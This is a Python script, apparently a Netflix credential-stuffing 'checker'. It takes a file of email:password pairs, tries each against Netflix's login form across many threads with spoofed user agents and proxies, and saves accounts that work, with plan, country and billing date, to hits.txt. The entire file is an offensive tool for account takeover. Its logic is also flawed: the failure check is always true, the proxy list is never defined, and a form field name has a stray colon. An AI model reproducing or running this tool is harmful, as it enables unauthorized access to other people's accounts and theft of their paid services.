import requests, time, random, threading
from colorama import Fore
from fake_useragent import UserAgent as ua
from bs4 import BeautifulSoup as Soup

class Netflixer:
    def __init__(self):
        self.combos = []
        self.hits = 0
        self.bad = 0
        self.cpm = 0  
        self.retries = 0   
        self.lock = threading.Lock()
            
    def ui(self):
        text = ''' Sugus GhostStru was here'''        
        faded = ''
        red = 40
        for line in text.splitlines():
            faded += (f"\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
    
    def cpmCounter(self):
        while True:
            old = self.hits
            time.sleep(4)
            new = self.hits
            self.cpm = (new-old) * 15

    def updateTitle(self):
        while True:
            elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start))
            time.sleep(0.4)
    def getCombos(self):
        try:
            print(f'[ > ] Path to combolist> ')
            path = input("Conturi.txt list: ")
            with open(path, 'r', encoding="utf-8") as f:
                for l in f:
                     self.combos.append(l.replace('\n', ''))
        except:
            print(f'[ ! ] Failed to open combofile')
            quit()
        
    def checker(self, email, password):
        try:     
            client = requests.Session()
            login = client.get("https://www.netflix.com/ro-en/login", headers ={"User-Agent": ua().random})
            soup = Soup(login.text,'html.parser')
            loginForm = soup.find('form')
            authURL = loginForm.find('input', {'name': 'authURL'}).get('value')   
            
            headers = {"user-agent": ua().random,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "accept-language": "en-US,en;q=0.9", "accept-encoding": "gzip, deflate, br", "referer": "https://www.netflix.com/login", "content-type": "application/x-www-form-urlencoded","cookie":""}
            data = {"userLoginId:": email, "password": password, "rememberMeCheckbox": "true", "flow": "websiteSignUp", "mode": "login", "action": "loginAction", "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode", "authURL": authURL, "nextPage": "https://www.netflix.com/browse","countryCode": "+1","countryIsoCode": "US"}  
            
            request = client.post("https://www.netflix.com/ro-en/login",headers =headers, data =data)
            cookie = dict(flwssn=client.get("https://www.netflix.com/ro-en/login", headers ={"User-Agent": ua().random}).cookies.get("flwssn"))
            
            if 'Sorry, we can\'t find an account with this email address. Please try again or' or 'Incorrect password' in request.text:
                self.lock.acquire()
                print(f'[ BAD | {email} | {password} ')
                self.bad += 1
                self.lock.release()
            
            else:     
                info = client.get("https://www.netflix.com/YourAccount", headers ={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,"Accept-Encoding": "gzip, deflate, br" ,"Accept-Language": "en-US,en;q=0.9" ,"Connection": "keep-alive" ,"Host": "www.netflix.com" ,"Referer": "https://www.netflix.com/browse" ,"Sec-Fetch-Dest": "document" ,"Sec-Fetch-Mode": "navigate" ,"Sec-Fetch-Site": "same-origin" ,"Sec-Fetch-User": "?1" ,"Upgrade-Insecure-Requests": "1" ,"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"}, cookies =cookie, proxies =random.choice(self.proxies), timeout =10).text
                plan = info.split('data-uia="plan-label"><b>')[1].split('</b>')[0]
                country = info.split('","currentCountry":"')[1].split('"')[0]
                expiry = info.split('data-uia="nextBillingDate-item">')[1].split('<')[0]
                self.lock.acquire()
                print(f'[ HIT | {email} | {password} | {plan} | {country} | {expiry}')
                self.hits += 1
                with open('hits.txt', 'a', encoding='utf-8') as fp:
                    fp.writelines(f'Email: {email} Pass: {password} - Plan: {plan} - Country: {country} - Validity: {expiry}\n')   
                self.lock.release()
                
        except:
            self.lock.acquire()
            print(f'[ ! ] ERROR | Proxy timeout. Change your proxies or use a different VPN')
            self.retries += 1
            self.lock.release()
    
    def worker(self, combos, thread_id):
        while self.check[thread_id] < len(combos):
            combination = combos[self.check[thread_id]].split(':')
            self.checker(combination[0], combination[1])
            self.check[thread_id] += 1 

    def main(self):
        self.ui()
        self.getCombos()
        try:
            self.threadcount = int(input(f'[>] Threads> '))
        except ValueError:
            print(f'[ ! ] Value must be an integer')
            quit()
               
        self.ui()
        self.start = time.time()
        threading.Thread(target =self.cpmCounter, daemon =True).start()
        threading.Thread(target =self.updateTitle ,daemon =True).start()
        
        threads = []
        self.check = [0 for i in range(self.threadcount)]
        for i in range(self.threadcount):
            sliced_combo = self.combos[int(len(self.combos) / self.threadcount * i): int(len(self.combos)/ self.threadcount* (i+1))]
            t = threading.Thread(target= self.worker, args= (sliced_combo, i,) )
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print(f'[ + ] Task completed')
        
n = Netflixer()
n.main()
